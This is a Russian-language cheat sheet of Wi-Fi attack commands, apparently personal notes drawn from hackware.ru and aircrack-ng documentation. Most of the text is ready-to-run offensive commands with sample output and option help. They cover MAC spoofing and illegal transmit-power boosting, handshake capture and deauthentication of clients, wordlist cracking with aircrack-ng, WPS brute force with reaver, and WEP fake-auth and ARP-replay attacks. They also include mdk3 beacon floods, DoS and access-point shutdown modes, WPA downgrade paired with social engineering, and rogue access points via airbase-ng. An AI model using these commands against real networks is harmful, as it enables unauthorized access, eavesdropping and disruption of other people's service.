Обнаружение и анализ Wi-Fi сетей
https://www.securitylab.ru/software/1426/

https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
https://hashcat.net/wiki/doku.php?id=mask_attack
https://hashcat.net/forum/thread-7717.html
https://hashcat.net/forum/thread-6661.html
https://hashcat.net/forum/thread-10253.html

Работающие способы взлома Wi-Fi в 2022
https://hackware.ru/?p=10907
Аудит безопасности Wi-Fi с Hashcat и hcxdumptool
https://hackware.ru/?p=18103
Повышение эффективности аудита безопасности Wi-Fi: новые инструменты, хеш и техники
https://hackware.ru/?p=18075

KRACK на практике. Как работает атака на Wi-Fi с применением нашумевшей техники
https://xakep.ru/2019/12/11/krack/
Как стать гуру или WiFi Cheat Sheet
https://habr.com/ru/articles/761450/
Анализ безопасности Wi-Fi: атаки на WPA2-Personal / Enterprise и методология взлома WPA3
https://habr.com/ru/companies/bastion/articles/777182/
Новая техника атаки WPA2, не требующая наличия клиента на AP
https://habr.com/ru/companies/jetinfosystems/articles/419383/

Олег Купреев
https://www.youtube.com/@DC7499/videos
______________________________

варианты отключения сетевого интерфейса:
sudo ifconfig wlan0 down
sudo ip link set wlan0 down
sudo networkctl down wlan0
______________________________

варианты отключения сетевого интерфейса:
sudo macchanger -m XX:XX:XX:XX:XX:XX wlan0 
sudo ifconfig wlan0 hw ether MAC
sudo ip link set dev wlan0 address XX:XX:XX:XX:XX:XX
______________________________

Подробная информация об адаптерах
iw list
iw phy0 info

iwlist wlan0 scan - сканирование с использованием интерфейса wlan0
iwlist scan - сканирование wifi

Просмотрим список доступных сетей (с использованием интерфейса wlan0, не mon) :
nmcli dev wifi
Справка:
nmcli --help

Подключимся к новой сети с SSID "Lohi" используя пароль cykacyka
    nmcli dev wifi con "Lohi" password cykacyka name "My cafe"
______________________________

СМЕНА КАНАЛА
iwconfig wlan0 channel 1
iw dev wlan0 set channel 1

СМЕНА ЧАСТОТЫ
iw dev wlan0 set freq 2437
______________________________

ifconfig wlan0 down — выключаем интерфейс
macchanger -r wlan0 —  меняем MAC
iw reg set BZ — выставляем регион Белиз
iwconfig wlan0 txpower 30 — увеличиваем мощность
iw dev {WLAN} set txpower fixed 3000
ifconfig wlan0 up — поднимаем интерфейс
https://github.com/Distrotech/wireless-regdb/blob/master/db.txt - мощность/страны
______________________________

РЕЖИМ МОНИТОРА

Переключение в режим монитора (wlan0mon)
airmon-ng start wlan0

before you run, you must set your wlan device to monitor mode:
iwconfig wlan0 mode monitor

Переключение в режим монитора (без mon0)
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig

ip link set wlan1 down
iw dev wlan1 set type monitor  (sudo iw wlan1 set monitor control)
ip link set wlan1 up

Добавление режима монитор (проверить после iwconfig)
iw wlan0 interface add mon0 type monitor

wlan0 - физический интерфейс
mon - виртуальный интерфейс

РЕЖИМ КЛИЕНТА

ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
______________________________

Некоторые программы могут вмешиватся в работу адаптера. Их список можно просмотреть:
    airmon-ng check
 и при необходимости сделать попыку завершить их работу:
    airmon-ng check kill
	
но лучше подредактировать этот файл
/etc/NetworkManager/NetworkManager.conf

[main]
plugins=ifupdown,keyfile

[ifupdown]
managed=false

[ketfile]
unmanaged-devices=mac:28:ac:ac:ac:ac:ac
# unmanaged-devices=interface-name:enp1s0
# unmanaged-devices=type:ethernet
______________________________

ЗАХВАТ ПАКЕТОВ
airodump-ng wlan0 -c 1 --bssid 68:15:90:EB:B3:FE -w /root/Desktop/wpa2/key

 Где:
   -c 1 это номер канала точки доступа
   --bssid 68:15:90:EB:B3:FE это MAC адрес точки доступа
   wlan0 это имя интерфейса

airodump-ng -c 9 --bssid 44:E9:DD:27:D9:F6 -w output.cap --showack wlan0mon

Now you can capture, e.g. using tcpdump: 
tcpdump -i mon0 -n -w wireless.cap
______________________________

ДЕАУТЕНТИФИКАЦИЯ ОПРЕДЕЛЕННОГО КЛИЕНТА
aireplay-ng -0 1 -a 68:15:90:EB:B3:FE -c C4:17:FE:9C:C3:7A wlan0

 Где:
   -0 означает деаутентификацию
   1 это количество отправляемых пакетов деаутентификации (вы можете отправлять несколько, если хотите); 0 означает отправлять их непрерывно
   -a 68:15:90:EB:B3:FE это MAC адрес точки доступа
   -c C4:17:FE:9C:C3:7A это MAC адрес клиента для деаутентификации; если это значение пропущено, то все клиенты будут деаутентифицированы
   wlan0 это имя интерфейса

Типичный вывод
    12:35:25 Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
    12:35:25 Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
	
ДЕАУТЕНТИФИКАЦИЯ ВСЕХ КЛИЕНТОВ	
aireplay-ng -0 0 -a 68:15:90:EB:B3:FE wlan0	
______________________________

AIRCRACK-NG - Декодирование (расшифровка пароля)

AIRCRACK-NG ДЛЯ WINDOWS
"folder\WiFi\aircrack-ng-1.2-rc4-win_forWindows\bin\64bit\aircrack-ng-avx.exe" -w D:\worldlist -a 2 D:\handshake.cap

AIRCRACK-NG ДЛЯ LINUX
aircrack-ng -w /root/Desktop/wpa2/worldlist -b 44:E9:DD:27:D9:F6 /root/Desktop/wpa2/handshake.cap
aircrack-ng -w pass.txt Router-D777C7.cap
______________________________

Wash — это утилита для идентификации точек доступа с включённым WPS
wash -i wlan0mon -C

Обязательные аргументы:
        -i, --interface=<iface>              Интерфейс для захвата пакетов
        -f, --file [FILE1 FILE2 FILE3 ...]   Читать пакеты из захваченных файлов
 
Опциональные аргументы:
        -c, --channel=<num>                  Канал для прослушивания [auto]
        -o, --out-file=<file>                Записать данные в файл
        -n, --probes=<num>                   Максимальное количество попыток отправки к каждоый ТД в режиме сканирования [15]
        -D, --daemonize                      Демонизация wash
        -C, --ignore-fcs                     Игнорировать ошибки проверки целостности фреймов
        -5, --5ghz                           Использовать каналы 5GHz 802.11
        -s, --scan                           Использовать режим сканирования
        -u, --survey                         Использовать режим опроса [default]
        -P, --file-output-piped              Позволяет стандартному выводу Wash передаваться другим программам. Пример. wash x|y|z...
        -g, --get-chipset                    Передача вывода и запуск reaver для определения чипсета
        -h, --help                           Показать справку

Опция -g программы wash автоматически запускает reaver для получения данных чипсета. Указание канала с помощью ключа -c
wash -i wlan0mon --scan -g -c 1,4,6
______________________________

 Airodump-ng может показать всю имеющуюся информацию о беспроводных точках в радиусе доступности. Тем не менее, по умолчанию она не имеет поля с информацией о WPS. Для того, чтобы это поле появилось, нужно использовать ключ --wps.

airodump-ng wlan0mon --wps

Запускать с дополнительными ключами --manufacturer (показывает производителя ТД) --uptime (показывает время работы):

airodump-ng wlan0mon --manufacturer --uptime --wps
______________________________

 Wifite — это программа для автоматизированного взлома. Для того, чтобы показывались ТД только с включённым WPS запускать нужно с ключом --wps:

wifite --wps
______________________________

ПОДБОР WPS
reaver -i wlan0 -b C4:6E:1F:82:51:B2
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -K 1 -vv
______________________________

АВТОПОДБОР WPS - WPA
besside-ng mon0
______________________________

ОЧИСТКА CAP-ФАЙЛОВ ДО ХЕНДШЕЙКОВ

cowpatty -c -r <cap_file> 

wpaclean <новый-pcap-файл> <pcap-файл> 

Открыть файл с помощью wireshark и применить фильтр:
eapol || wlan.fc.type_subtype == 0x08
Пример:
tshark -r n-01.cap -Y "eapol || wlan.fc.type_subtype == 0x08"

Преобразовать .cap в .pcap можно с помощью :
tshark -F libpcap -w <имя_файла_pcap> -r <имя_файла_cap>

КОНВЕРТИРОВАНИЕ cap И pcap ФАЙЛ В hccap

aircrack-ng <cap-файл> -J <hccap-файл>
aircrack-ng dumpfile.cap -J hccapfile
______________________________

ИНЪЕКЦИЯ ВСЕМ ТОЧКАМ ДОСТУПА НА ЭТОМ КАНАЛЕ
aireplay-ng -9 wlan0

 Пример вывода:
root@HackWare:~# aireplay-ng -9 wlan0
08:36:50 Trying broadcast probe requests...
08:36:50 Injection is working!
08:36:52 Found 2 APs

08:36:52 Trying directed probe requests...
08:36:52 F8:1A:67:F0:73:7A - channel: 1 - 'Janphen'
08:36:53 Ping (min/avg/max): 1.005ms/10.098ms/43.203ms Power: -89.04
08:36:53 25/30: 83%

08:36:53 64:66:B3:AE:8C:E7 - channel: 3 - 'TP-LINK_AP_AE8CE7'
08:36:55 Ping (min/avg/max): 1.412ms/35.386ms/150.605ms Power: -78.81
08:36:55 26/30: 86%

Анализ ответа:
    08:36:50 Injection is working!: Это подтверждает, что ваша карта может делать инжекты.
    08:36:52 Found 2 APs: Это точки доступа (ТД), которые были найдены трансляцией зондов или получением маяков.
    08:36:52 F8:1A:67:F0:73:7A - channel: 1 - 'Janphen': Обратите внимание, что могут быть найдены даже точки доступа на других каналах (а не на том, на который вы перевели вашу беспроводную карту). Это нормально, особенно для смежных каналов.
    08:36:53 Ping (min/avg/max): 1.005ms/10.098ms/43.203ms Power: -89.04: Это статистика качества связи с ТД.
    08:36:53 25/30: 83% для Janphen: Также важный индикатор качества связи.


ИНЪЕКЦИЯ ОПРЕДЕЛЕННОЙ ТОЧКЕ ДОСТУПА
aireplay-ng --test -e MTSRouter-0F92E7 -a A0:AB:1B:0F:92:E7 wlan0
______________________________

 Справка по Aireplay-ng

   использование:	
aireplay-ng <опции> <интерфейс>

     Опции фильтра:	
-b bssid  : MAC адрес, Точка Доступа
-d dmac   : MAC адрес, Место назначения
-s smac   : MAC адрес, Источник
-m len    : минимальная длинна пакета
-n len    : максимальная длинна пакета
-u type   : управление фреймом, тип    поле
-v subt   : управление фреймом, подтип поле
-t tods   : управление фреймом, От      DS bit
-f fromds : управление фреймом, К    DS bit
-w iswep  : управление фреймом, WEP     бит
-D        : отключить выявление ТД

      Опции повторного воспроизведения (инъекции):	
-x nbpps  : количество пакетов в секунду
-p fctrl  : установить контроллер фреймов слово (шестнадцатиричное)
-a bssid  : установить MAC address
-c dmac   : установить Пункт назначения  MAC адрес
-h smac   : установить Источник          MAC адрес
-g value  : изменить размер кольцевого буфера (по умолчанию: 8)
-F        : выбрать первый совпадающий пакет

      Опции атаки Фальшивая деаутентификация:	
-e essid  : установить SSID целевой ТД
-o npckts : количество пакетов за одну вспышку (0=автоматически, по умолчанию: 1)
-q sec    : секунды между временем жизни
-Q        : отправлять запросы о повторном переподключении
-y prga   : поток ключей для общего ключа аутентификации
-T n      : выйти после повторных попыток запросов фальшивой аутентификации n раз

     Опции атаки повторной отправки запросов ARP:	
-j  : инжект Из  DS пакетов

      Опции фрагментированной атаки:	
-k IP  : установить IP пункта назначения во фрагментах
-l IP  : установить IP источника во фрагментах

     Опции тестирования инжекта:	
-B  : активировать тест битрейта

    Опции источника:	
-i iface  : захватывать пакеты с этого интерфейса
-r файл   : извлечь пакеты из этого pcap файла

    Прочие опции:	
      -R  : отключить использование /dev/rtc 
      --ignore-negative-one : если интерфейс канала не может быть 
                              определён, игнорировать несоответствие, 
                              нужно для непропатченного cfg80211

 Режимы атаки (также можно использовать цифры):	
      --deauth      число : деаунтифицировать 1 или все станции (-0)
                            Подробности: Деаутентификация клиентов 
                            беспроводной сети в Kali Linux - 
                            http://hackware.ru/?p=74
      --fakeauth    задержка : фальшивая аутентификация с ТД (-1)
      --interactive       : интерактивный выбор фреймов (-2)
      --arpreplay         : стандартная повторная отправка запросов ARP (-3)
      --chopchop          : расшифровать/порубить WEP пакет (-4)
      --fragment          : сгенерировать валидный поток ключей   (-5)
      --caffe-latte       : запросить клиента на новые IVs  (-6)
      --cfrag             : фрагментирование в отношении клиента  (-7)
      --migmode           : атаки режим миграции WPA  (-8)
      --test              : тест возможности инжекта и качества соединения (-9). 
                            Подробности: Как узнать, поддерживает ли 
                            беспроводная карта инжект (инъекцию) -
                            
http://hackware.ru/?p=67
	
--help : Показать справку

Руководство по Aireplay-ng
      ОПЦИИ:
-H, --help

Показать сообщение помощи.

    Опции фильтра:
-b <bssid>

    MAC адрес точки доступа.
-d <dmac>

    MAC адрес пункта назначения.
-s <smac>

    MAC адрес источника.
-m <len>

    Минимальная длина пакета.
-n <len>

    Максимальная длина пакета.
-u <type>

    Управление фреймом, поле type.
-v <subt>

    Управление фреймом, поле subtype.
-t <tods>

    Управление фреймом, "To" DS бит (0 или 1).
-f <fromds>

    Управление фреймом, "From" DS бит (0 или 1).
-w <iswep>

   Управление фреймом, WEP бит (0 или 1).
-D

Отключить выявление ТД.

   Опции повторного воспроизведения:
-x <nbpps>

   Количество пакетов в секунду.
-p <fctrl>

   Установить слово контрольного фрейма (шестнадцатиричное).
-a <bssid>

   Установить MAC адрес точки доступа.
-c <dmac>

   Установить MAC адрес пункта назначения.
-h <smac>

   Установить MAC адрес источника.
-g <nb_packets>

   Изменить размер кольцевого буфера (по умолчанию: 8 пакетов). Минимум - 1.
-F

Выбрать первый подходящий пакет.

   Атака фальшивая аутентификация:
-e <essid>

Установить целевую SSID. Для SSID, содержащей специальные символы, смотри http://www.aircrack-ng.org/doku.php?id=faq#how_to_use_spaces_double_quote_and_sin‐gle_quote_etc._in_ap_names

-o <npackets>

Атака фальшивая аутентификация: Установить количество пакетов для каждой попытке аутентификации и ассоциации (По умолчанию: 1). 0 означает автоматически.

-q <секунды>

Атака фальшивая аутентификация: Установить время между временем жизни пакетов в режиме фальшивой аутентификации.

-Q

Атака фальшивая аутентификация: Отправлять запросы о повторном переподключении вместо выполнения полной аутентификации и ассоциации после каждого периода задержки.

-y <prga>

Атака фальшивая аутентификация: Определить поток ключей для фальшивого общего ключа аутентификации.

-T n

Атака фальшивая аутентификация: Выйти если фальшивая аутентификация провалилась 'n' раз.

Атака воспроизведения ARP :

-j

Инъекция пакетов FromDS.

-k <IP>

Фрагментированная атака: Установить пункт назначения IP во фрагментах.

-l <IP>

Фрагментированная атака: Установить источник IP во фрагментах.

-B

Опция тестирования: Тест битрейта.

Опции источника:

-i <iface>

Захватывать пакеты с этого интерфейса.

-r <файл>

Извлечь пакеты из этого pcap файла.

Прочие опции:

-R

Отключить использование /dev/rtc.

--ignore-negative-one

Если интерфейс канала не может быть определён, игнорировать несоответствие, нужно для непропатченного cfg80211

РЕЖИМЫ АТАКИ:

-0 <число>, --deauth=<число>

Эта атака отправляет пакеты деаутентификации одному или более клиентами, которые в настоящий момент связаны с определённой точкой доступа. Деаутентификация клиентов может быть сделана по ряду причин: Восстановление скрытого ESSID. Этот ESSID не показывается в вещании. Другая причина для этого — это «маскировка» или Захват рукопожатия WPA/WPA2 путём принудительной повторной аутентификации клиентов или Генерация ARP запросов (Windows клиенты иногда очищают их ARP кэш после рассоединения). Конечно, эта атака совершенно бесполезна если нет подключённых к беспроводной сети клиентов или при фальшивой аутентификации. Подробности: Деаутентификация клиентов беспроводной сети в Kali Linux.

-1 <задержка>, --fakeauth=<задержка>

Эта атака фальшивой аутентификации позволяет вам выполнить два типа WEP аутентификации (Открытая система и Общий ключ) плюс ассоциироваться с точкой доступа (ТД). Это полезно только когда вам нужен ассоциированный MAC адрес в различных атаках aireplay-ng, а ассоциированных клиентов в данный момент нет. Следует отметить, что атака фальшивой аутентификации НЕ генерирует какие-либо ARP пакеты. Фальшивая аутентификация не может быть использована для аутентификации/ассоциации с WPA/WPA2 точками доступа.

-2, --interactive

Эта атака позволяет вам выбрать определённый пакет для воспроизведения (инъекции). Атака может получить пакеты для воспроизведения из двух источников. Первым является живой поток пакетов с вашей беспроводной карты. Вторым является файл pcap. Многие упускают из виду такую функцию aireplay-ng как чтение из файла. Она позволяет вам прочитать пакеты из захваченный сессий или нередко из различных сгенерированных для атак файлов pcap для простого повторного использования. Популярное использование — это чтение файла, который вы создали с помощью packetforge-ng.

-3, --arpreplay

Классическая атака повторного воспроизведения ARP запроса — это наиболее эффективный способ сгенерировать новые векторы инициализации (IVs), и работает он очень надёжно. Программа ищет ARP пакеты, затем пересылает их обратно к точке доступа. Это, в свою очередь, приводит точку доступа к повторению ARP пакета с новыми IV. Программа пересылает тот же ARP пакет снова и снова. При этом каждый ARP пакет, повторённый точкой доступ, имеет новые IVs. Это всё новые IVs, которые позволяют вам определить WEP ключ.

-4, --chopchop

Эта атака, в случае успеха, может расшифровать пакет данных WEP не зная ключа. Это может работать даже в отношении динамического WEP. Эта атака не восстанавливает сам WEP ключ, но лишь раскрывает простой текст. Тем не менее, некоторые точки доступа не уязвимы к этой атаке. Некоторые поначалу кажутся уязвимыми, но на самом деле отбрасывают пакеты данных короче чем 60 байт. Если точка доступа отбразывает пакеты корочем чем 42 байта, aireplay пытается предположить оставшиеся пропущенные данные, т. к. заголовок является предсказуемым. Если захвачен IP пакет, дополнительно проверяется контрольная сумма заголовка на корректность после угадывания недостающей его части. Эта атака требует по крайней мере один WEP пакет.

-5, --fragment

Эта атака, при успехе, может получить 1500 байт из PRGA (алгоритм псевдослучайной генерации). Эта атака не раскрывает сам WEP ключ, но лишь получает PRGA. Этот PRGA можно использовать для генерации пакета с packetforge-ng, который, в свою очередь, использовать для различных инъекционных атак. Требуется получить по крайней мере один пакет от точке доступа, чтобы инициировать эту атаку.

-6, --caffe-latte

В общих чертах, для того, чтобы атака сработала, атакующий должен быть в диапазоне ТД и подключённого клиента (фальшивого или реального). Атака Caffe Latte позволяет собрать достаточно пакетов для взлома WEP ключа без необходимости ТД, достаточно просто клиента в диапазоне.

-7, --cfrag

Эта атака превращает IP или ARP пакеты от клиента в ARP запросы в отношении клиента. Эта атака работает особенно хорошо в отношении сетей ad-hoc. Также она может использоваться в отношении клиентов softAP (программной точки доступа) и нормальных клиентов ТД.

-8, --migmode

Эта атака работает в отношении точек доступа Cisco Aironet, настроенных в WPA Migration Mode, который позволяет как клиентам WPA, так и WEP подключаться к точке доступа используя одинаковый Service Set Identifier (SSID). Программа прослушивает WEP-инкапсулированный широковещательный ARP пакет, меняет биты, чтобы переделать его в ARP, приходящий с MAC адреса атакующего, и переправляет к точке доступа. Это, в свою очередь, приводит к тому, что точка доступа повторяет ARP пакет с новым IV и также переправляет ARP ответ к атакующему с новым IV. Программа пересылает тот же ARP пакет снова и снова. При этом каждый ARP пакет, повторённый точкой доступа, имеет новый IV, и ARP ответ перенаправляется точкой доступа к атакующему. Все эти новые IV позволяют вам определить WEP ключ.

-9, --test 
______________________________

https://hackware.ru/?p=67

 Тест атаки

Этот тест требует две беспроводных карты в режиме монитора. Карта указанная за “-i” выступает в роли точки доступа.

Выполните следующую команду:

aireplay-ng -9 -i wlan1 wlan0

Где:

    -9 означает тест инжекта.
    -i wlan1 — это интерфейс для мимикрии под точку доступа и получения пакетов.
    wlan0 это интерфейс для инъекций.

Системный ответ:  

 11:06:05  wlan0 channel: 9, wlan1 channel: 9
 11:06:05  Trying broadcast probe requests...
 11:06:05  Injection is working!
 11:06:05  Found 1 APs
 
 11:06:05  Trying directed probe requests...
 11:06:05  00:de:ad:ca:fe:00 - channel: 9 - 'teddy'
 11:06:05  Ping (min/avg/max): 2.763ms/4.190ms/8.159ms
 11:06:07  26/30: 87%
 
 11:06:07  Trying card-to-card injection...
 11:06:07  Attack -0:        OK
 11:06:07  Attack -1 (open): OK
 11:06:07  Attack -1 (psk):  OK
 11:06:07  Attack -2/-3/-4:  OK
 11:06:07  Attack -5:        OK

Анализ ответа:

    11:06:05 wlan0 channel: 9, wlan1 channel: 9: Это импорт чтобы убедиться, что обе ваши карты на одном канале, иначе тесты пройдут некорректно.
    Первая часть вывода идентична тому, что было показано выше.
    Последняя часть показывает, что карта wlan0 способна успешно выполнять все типы атак.
    Если сказано, что атака 5 неудачна, она может оказаться рабочей в полевых условиях, если MAC адрес для инъекции соответствует MAC адресу текущей карты. С некоторыми драйверами возникает ошибка, если они не одинаковые.
______________________________

 Тест Airserv-ng

Запустите Airserv-ng:

airserv-ng -d wlan0

Система ответит:

 Opening card wlan0
 Setting chan 1
 Opening sock port 666
 Serving wlan0 chan 1 on port 666

Затем запустите следующую команду:

aireplay-ng -9 127.0.0.1:666

Где:

    -9 означает атаку инъкции.
    127.0.0.1:666 это IP адрес и номер порта airserv-ng. Ему не обязательно быть локальным адресом, как показано в этом примере. Это может быть любой IP адрес.

Система отвечает:  

 14:57:23  Testing connection to injection device 127.0.0.1:666
 14:57:23  TCP connection successful
 14:57:23  airserv-ng found
 14:57:23  ping 127.0.0.1:666 (min/avg/max): 0.310ms/0.358ms/0.621ms
 
 Connecting to 127.0.0.1 port 666...
 Connection successful
 
 14:57:24  127.0.0.1:666 channel: 9
 14:57:24  Trying broadcast probe requests...
 14:57:24  Injection is working!
 14:57:25  Found 1 AP 
 
 14:57:25  Trying directed probe requests...
 14:57:25  00:14:6C:7E:40:80 - channel: 9 - 'teddy'
 14:57:26  Ping (min/avg/max): 1.907ms/38.308ms/39.826ms
 14:57:26  30/30: 100%

Анализ ответа:

    Connection successful: Это показывает, что есть контакт. Это импорт чтобы убедиться, что обе ваши карты на одном канале, иначе тесты пройдут некорректно.
    Вторая часть вывода идентична тому, что было показано ранее.

______________________________

Fake authentation

    airodump-ng -c <channel> -w <out_file> --bssid <bssid> <interface> # dumping...
    # making fake authentication
    aireplay-ng -l 0 -a <bssid> -h <my_ssid> <interface>
    #start airplay-ng in ARP request replay mode (-3 )
    aireplay-ng -3 -b <bssid> -h <my_ssid> <interface>
    #cracking the password
    aircrack-ng -n <64 or 128 or ..> --bssid <bssid> <cap file>

______________________________

mdk3 --fullhelp

mdk3 wlan0mon b -v example -g -t -w -m

mdk3 wlan0mon b -v example -g -t -w -m -c 11

mdk3 wlan0mon g -t 78:96:82:2d:30:66

mdk3 wlan0mon g -e RT-WiFi_3066

mdk3 wlan0mon w -e RT-WiFi_3066

mdk3 wlan0mon p -e RT-WiFi_3066

mdk3 wlan0mon p -a 78:96:82:2d:30:66

mdk3 wlan0mon a -a 78:96:82:2d:30:66

mdk3 wlan0mon b -n "FREE WIFI" -g -t 00:1E:20:36:24:3C -m -c 11

free AP - mdk3 wlan0mon b -v example -g -m

 Подробная справка по mdk3
b - Режим флуда маяками
Отправляет фреймы маяков для показа фальшивых точек доступа клиентам. Это иногда может привести к падению сканеров сети или даже драйверов!
ОПЦИИ:
-n <ssid>
Использовать SSID <ssid> вместо сгенерированных случайным образом
-f <имя_файла>
Считывать SSIDs из файла
-v <имя_файла>
Считывать MACs и SSIDs из файла. Смотрите файл с примером! (в Kali Linux, возможно, эти файлы здесь /root/opt/mdk3-master/useful_files/)
-d
Показать станцию как Ad-Hoc
-w
Установить бит WEP (Создаёт зашифрованные сети)
-g
Показать станцию как 54 Mbit
-t
Показать станцию использующих шифрование WPA TKIP
-a
Показать станцию использующих шифрование WPA AES
-m
Использовать валидные MAC адреса для точек доступа из базы данных OUI
-h
Перепрыгнуть на канал, где спуфится ТД
Это делает тест более эффективным в отношении некоторых устройств/драйверов. Но он уменьшает скорость пакетов из-за прыжков по каналам.
-c <канал>
Фальшивая ТД на канале <канал>. Если вы хотите, чтобы ваша карта перепрыгнула на этот канал, вы должны также установить опцию -h!
-s <pps>
Устанавливает скорость в пакетах в секунду (По умолчанию: 50)
a - Режим DoS аутентификации
Отправляет пакеты аутентификации всем точкам доступа, найденным в диапазоне доступности. Слишком большое количество клиентов может привести к зависанию или даже сбросу некоторых ТД.
ОПЦИИ:
-a <ap_mac>
Тестировать только заданную ТД
-m
Использовать валидные MAC адреса для точек доступа из базы данных OUI
-c
НЕ проверять, был тест успешным
-i <ap_mac>
Выполнить интеллектуальный тест по ТД (-a и -c будут проигнорированы)
Этот тест подключает клиентов к ТД и делает повторные инжекты стащенных данных для поддержания соединения
-s <pps>
Устанавливает скорость в пакетах в секунду (По умолчанию: неограниченно)
p - Базовое зондирование и режим брутфорса ESSID
Зондирует ТД и проверяет ответы, полезно для проверки была ли SSID разоблачена верно или если ТД в ваших адаптерах отправляет диапазон используйте опции -f и -t для включения брутфорсинга SSID
ОПЦИИ:
-e <ssid>
Говорит mdk3 которую SSID зондировать
-f <имя_файла>
Считывать строки из файла для брутфорсинга скрытых SSIDs
-t <bssid>
Установить MAC адрес целевой ТД
-s <pps>
Установить скорость (По умолчанию: неограниченна, в режиме брутфорса: 300)
-b <набор символов>
Использовать полный режим брутфорса (рекомендуется только для коротких SSIDs!).
Наборы символов:
    все печатные (a)
    нижний регистр (l)
    верхний регистр (u)
    цифры (n)
    нижний и верхний регистр (c)
    нижний и верхний регистр плюс цифры (m)
d - Режим деаутентификации / озверевшего отключения
Выбрасывает всех от ТД
ОПЦИИ:
-w <имя_файла>
Прочитать файл содержащий MAC адреса которые не надо беспокоить (Режим белого списка)
-b <имя_файла>
Прочитать файл содержащий MAC адреса по которым нужно проводить тест (Режим чёрного списка)
-s <pps>
Установить скорость в пакетах в секунду (По умолчанию: неограниченно)
-c [канал,канал,канал,…]
Включить переключение каналов. Если не будут указаны какие-либо каналы, mdk3 будет прыгать по всем 14 b/g каналам. Канал будет меняться каждые 5 секунд.
m - Эксплуатация вырубания по Мишелю (TKIP)
Прекращает весь трафик на постоянной основе
ОПЦИИ:
-t <bssid>
Установить Mac адрес целевой ТД
-w <seconds>
Секунды между вспышками (По умолчанию: 10)
-n <ppb>
Установить количество пакетов за один буст (По умолчанию: 70)
-j
Использовать новый эксплойт QoS TKIP
Нужно всего несколько пакетов чтобы положить ТД!
-s <pps>
Установить скорость (По умолчанию: 400)
x - Тесты 802.1X
ОПЦИИ:
0 - Начать пакетный флудинг EAPOL
-n <ssid>
Использовать SSID <ssid>
-t <bssid>
Установить Mac адрес целевой ТД
-w <тип WPA>
Установить тип WPA (1: WPA, 2: WPA2/RSN; по умолчанию: WPA)
-u <одноадресный шифр>
Установить одноадресный тип шифра (1: TKIP, 2: CCMP; по умолчанию: TKIP)
-m <multicast cipher>
Установить групповой тип шифра (1: TKIP, 2: CCMP; по умолчанию: TKIP)
-s <pps>
Установить скорость (По умолчанию: 400)
1 - EAPOL Logoff test
-t <bssid>
Установить MAC адрес целевой ТД
-c <bssid>
Установить MAC адрес целевой ТД СТАНЦИИ
-s <pps>
Установить скорость (По умолчанию: 400)
w - Бардак WIDS/WIPS
Запутывает / Сбивает системы обнаружения и предупреждения вторжений
ОПЦИИ:
-e <SSID>
SSID целевой сети WDS
-c [канал,канал,канал…]
Использовать переходы по каналам
-z
активировать эксплойт Zero_Chaos' WIDS (аутентифицировать клиентов с WDS на другие ТД, чтобы свести с ума WIDS)
f - Режим брутфорса фильтра MAC
Этот тест использует список известных MAC адресов клиентов и пытается пройти аутентификацию с ними в заданной ТД, при этом динамически изменяется таймаут ответа для лучшей производительности. В настоящее время это работает на ТД, которые отклоняют должным образом открытый запрос аутентификации
ОПЦИИ:
-t <bssid>
Целевая BSSID
-m <mac>
Установить диапазон MAC адресов для использования (3 байта, например, 00:12:34). Если не указана -m, то будет использоваться внутренняя база данных.
-f <mac>
Установить MAC адрес с которого будет начат брутфорс. (Внимание: Вы не можете использовать -f и -m в одно время)
g - Тест понижения WPA
Производит деаутентификацию Станций и ТД отправкой шифрованных пакетов WPA. В этим тестом вы можете проверить, попробует ли сисадмин установить настройки сети на WEP или отключить шифрование. mdk3 разрешит клиентам работать с WEP и без шифрования, поэтому если системный администратор просто подумает «WPA сломалась» (что может произойти с некомпетентными сотрудниками). Это можно/нужно комбинировать с социальной инженерией.
ОПЦИИ:
-t <bssid>
Целевая сеть
t - Тесты зондирующими запросами (mod-musket)
Отправка невалидных символов в имени ТД в надежде вызвать её перезагрузку.
ОПЦИИ
mdk3 <mon> t <канал> <bssid ТД> <фреймы/секунду> 

 Установка мода от Musket (mod-musket-r1) в Kali Linux

Эта версия MDK3 имеет новую функцию для отправки направленных зондирующих запросов к ТД с невалидными символами SSID. Надежда на то, что достаточное количество отправленных зондов заблокирует ТД и перезагрузит.

После установки появится новый режим:
    t - Тесты зондирующими запросами (mod-musket)
mdk3 <mon> t <канал> <bssid ТД> <фреймы/секунду>

git clone https://github.com/charlesxsh/mdk3-master.git
cd mdk3-master
make
sudo make install

Запускать так:
sudo /usr/local/sbin/mdk3

git clone https://github.com/aircrack-ng/mdk4.git
apt-get install pkg-config libnl-3-dev libnl-genl-3-dev 
cd /mdk4-master
make
sudo make install
______________________________

pyrit -r wlan0mon -o $(date +%Y-%m-%d_%H:%M:%S)_stripped.cap stripLive
______________________________

ПОДДЕЛЬНАЯ ТОЧКА ДОСТУПА (открытая)
airbase-ng -a 44:E9:DD:27:D8:F6 -e TTK -c 10 -P  wlan0mon
BSSID: -a 44:E9:DD:27:D8:F6
ESSID: -e TTK
канал: -c 10
реагировать на все запросы: -P   
интерфейс: wlan0mon

ПОДДЕЛЬНАЯ ТОЧКА ДОСТУПА (WPA2)
airbase-ng -a 44:E9:DD:27:D8:F6 -e TTK -c 10 -Z 4  wlan0mon
шифрование WPA2+CCMP : -Z  4
______________________________

 В Linux изменить MAC своего адаптера можно следующим образом (работает как для проводных сетей, так и для беспроводных):

ifconfig wlan0 down 
ifconfig wlan0 hw ether 00:11:22:AA:AA:AA 
ifconfig wlan0 up

 Кроме того, в *nix есть macchanger — с его помощью можно выставить себе случайный MAC. Если поставить его в init.d, то неприятель будет совершенно сбит с толку, так как при каждой загрузке наш MAC будет другим (работает для любых проводных и беспроводных адаптеров, как и ifconfig).

# Случайный MAC:
macchanger -r wlan0 
# Определённый MAC:
macchanger -m 11:22:33:AA:BB:CC wlan0 
или так
macchanger --mac=2F:4B:D9:33:89:0B wlan0
# Показать MAC:
macchanger -s wlan0 
______________________________

scapy

имена ESSID

sniff(iface='wlan0mon', prn=lambda x: x.info, lfilter=lambda z: z.haslayer(Dot11ProbeReq))
____________
пакеты hexdump

sniff(iface='wlan0mon', prn=lambda x: hexdump(x), lfilter=lambda z: z.haslayer(Dot11ProbeReq))
____________
подробная информация

